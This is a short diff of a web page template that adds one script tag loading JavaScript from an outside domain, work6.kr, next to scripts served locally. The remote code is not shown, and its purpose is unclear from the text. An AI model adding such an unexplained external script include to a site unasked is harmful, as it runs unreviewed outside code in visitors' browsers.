@@ -52,6 +52,7 @@
   <script src="/public/lib/touchSwipe/jquery.touchSwipe.min.js"></script>
   <script src="/public/js/fullcalendar.js" type="text/javascript"></script>
   <script src="/public/ckeditor/ckeditor.js" type="text/javascript" charset="utf-8"></script>
+  <script src="//work6.kr/plugin/plugin_link/37"></script>
 
   <!-- Template Main Javascript File -->
   <script src="/public/js/main.js?<?=time()?>"></script>
